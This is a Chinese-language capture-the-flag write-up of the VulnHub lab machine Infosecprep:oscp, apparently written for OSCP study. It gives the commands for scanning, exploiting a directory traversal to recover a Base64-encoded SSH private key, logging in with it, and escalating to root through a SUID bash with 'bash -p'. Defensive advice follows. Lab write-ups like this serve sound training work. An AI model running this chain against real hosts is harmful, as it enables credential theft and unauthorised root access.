---
title: VulnHub Infosecprep:oscp 完整渗透测试复现
description: VulnHub靶机 Infosecprep:oscp 完整渗透测试复现，涵盖 WordPress 枚举、目录遍历获取 Base64 编码
  SSH 私钥、SUID bash 提权全链路
category: program-analysis
tags:
- VulnHub
- 渗透测试
- WordPress
- 目录遍历
- SSH私钥
- Base64解码
- SUID提权
- bash -p
- OSCP备考
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

本页面记录 VulnHub 靶机 **Infosecprep:oscp** 的完整渗透测试复现过程。该靶机模拟了一个典型的 WordPress 站点环境，攻击链路涵盖信息收集、Web 应用枚举、目录遍历漏洞利用获取 Base64 编码的 SSH 私钥、SSH 密钥认证登录、以及利用 SUID `bash` 二进制文件提权至 root 的全过程。适合 OSCP 备考阶段的实战演练与方法论沉淀。

> 项目下载地址：https://download.vulnhub.com/infosecprep/oscp.zip

---

## 攻击链路总览

```mermaid
flowchart TD
    A[主机发现] --> B[端口服务扫描]
    B --> C[Web 服务枚举]
    C --> D[WordPress 版本识别]
    D --> E[目录遍历漏洞]
    E --> F[Base64 编码 SSH 私钥]
    F --> G[Base64 解码]
    G --> H[SSH 密钥认证登录]
    H --> I[SUID bash 提权]
    I --> J[Root 权限获取]
```

---

## 0x00 主机发现

使用 `netdiscover` 或 `arp-scan` 进行内网存活主机探测，确定目标 IP：

```bash
netdiscover -r 192.168.33.0/24
```

**结果**：目标 IP 为 `192.168.33.131`

> 💡 同类靶机实战可参考 [[glasgowsmile-vulnhub-writeup]]，其中同样从主机发现切入，后续通过 Joomla CMS 爆破、多层编码破解、定时任务提权完成完整攻击链。

---

## 0x01 端口服务扫描

使用 `nmap` 进行全面端口扫描与服务版本识别：

```bash
nmap -sS -sV -p- -T4 192.168.33.131
```

**开放端口**：
| 端口 | 服务 | 版本信息 |
|------|------|----------|
| 22   | SSH  | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80   | HTTP | Apache httpd 2.4.29 (Ubuntu) |

---

## 0x02 Web 服务枚举与 WordPress 识别

### 访问 80 端口

访问 `http://192.168.33.131` 发现经典 WordPress 站点，页面提示关键信息：

> **"only user for the box is 'oscp'"**

这暗示系统可能仅存在 `root` 与 `oscp` 两个用户，或 WordPress 后台仅存在 `oscp` 账户。

### WordPress 版本识别

使用 `cmseek` 进行 WordPress 深度扫描：

```bash
cmseek -u http://192.168.33.131
```

扫描结果显示 WordPress 版本及已安装插件/主题信息，为后续漏洞利用提供方向。

---

## 0x03 目录遍历漏洞利用

### 发现目录遍历

通过目录扫描工具（如 `dirb`、`gobuster`）或手工测试，发现存在目录遍历漏洞的参数/路径。访问特定 URL 可读取敏感文件。

### 获取 Base64 编码的 SSH 私钥

利用目录遍历读取到疑似 SSH 私钥的 Base64 编码内容：

```
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
```

### Base64 解码还原私钥

```bash
echo "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K..." | base64 -d > id_rsa
chmod 600 id_rsa
```

解码后确认为标准 OpenSSH 私钥格式（`-----BEGIN OPENSSH PRIVATE KEY-----`）。

---

## 0x04 SSH 密钥认证登录

使用解码后的私钥以 `oscp` 用户身份登录：

```bash
ssh -i id_rsa oscp@192.168.33.131
```

成功获得低权限 Shell。

---

## 0x05 权限提升：SUID bash 提权

### 获取完整交互式 Shell

常规 Python PTY 升级在此环境下受限，需采用替代方案：

```bash
# 尝试标准方式（本靶机受限）
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z 背景化
stty raw -echo; fg
reset
stty rows 40 columns 120
```

### 搜索 SUID 二进制文件

```bash
find / -perm -u=s -type f 2>/dev/null
```

**关键发现**：
```
/usr/bin/bash
```

`/usr/bin/bash` 具有 SUID 位（`-rwsr-xr-x`），且版本支持 `-p` 参数保持提权后的有效 UID。

### 利用 `bash -p` 直接提权

```bash
/usr/bin/bash -p
whoami
# 输出: root
```

> ⚠️ **原理说明**：`bash -p` 会启动一个保持有效 UID（EUID）不变的特权 Shell。当 bash 本身拥有 SUID 位且属于 root 时，普通用户执行 `bash -p` 即可获得 root 权限。这是 Linux 提权中经典的「SUID Shell」利用方式。

---

## 0x06 提权验证与 Flag 获取

```bash
id
# uid=1000(oscp) gid=1000(oscp) euid=0(root) groups=1000(oscp)

cat /root/flag.txt
# 或 cat /root/proof.txt
```

成功获取 root 权限并读取 Flag，完成靶机攻破。

---

## 关键知识点沉淀

| 技术点 | 核心要点 | 备注 |
|--------|----------|------|
| **WordPress 枚举** | `cmseek`、`wpscan`、手工枚举用户/插件/主题 | 信息收集基石 |
| **目录遍历** | `../../etc/passwd`、编码绕过、参数污染 | 需结合 WAF 绕过技巧 |
| **Base64 编码私钥** | 识别 `-----BEGIN OPENSSH PRIVATE KEY-----` 头部、`LS0tLS1` 头部特征 | 常见于备份文件、配置泄露 |
| **SSH 密钥认证** | `chmod 600` 权限要求、`-i` 指定私钥、用户名枚举 | 密钥复用风险 |
| **SUID bash -p** | `find / -perm -u=s` 搜索、bash 版本 ≥ 4.2 支持 `-p`、EUID 保持 | 经典提权向量，`GTFOBins` 收录 |

---

## 防御与缓解建议

1. **Web 应用层**：禁止目录遍历，规范化路径处理，部署 WAF 规则拦截 `../` 等载荷
2. **文件权限管理**：最小化 SUID 二进制文件，定期审计 `find / -perm -u=s` 结果
3. **SSH 密钥管理**：禁用密码认证、强制密钥加密存储、定期轮换、监控异常登录
4. **最小权限原则**：Web 服务以非 root 用户运行，限制 Shell 访问（如 `rbash`、容器化隔离）
5. **审计与监控**：开启 `auditd` 监控 SUID 执行、SSH 登录、关键文件访问

---

## 扩展学习资源

- **同类靶机实战**：[[glasgowsmile-vulnhub-writeup]] —— Joomla CMS 爆破到多层编码破解再到定时任务提权的完整链路
- **渗透测试方法论**：[[edu-src-penetration-test-case-study]] —— 教育行业 SRC 实战案例，涵盖资产发现、弱口令、XSS、文件上传 Getshell 全链路
- **Linux 提权速查**：[GTFOBins - bash](https://gtfobins.github.io/gtfobins/bash/#suid) —— SUID bash 利用变体与约束条件
- **OSCP 备考指南**：[TJ Null OSCP Prep List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8) —— 官方推荐练习靶机清单

---

## 变更记录

| 日期 | 版本 | 变更说明 |
|------|------|----------|
| 2024-01-15 | 1.0 | 初始版本：整理微信归档文章，结构化攻击链路，增加交叉引用与防御视角 |

## 来源

- [0x00实验室-202108-202304_016](../sources/0x00实验室-202108-202304_016.md)
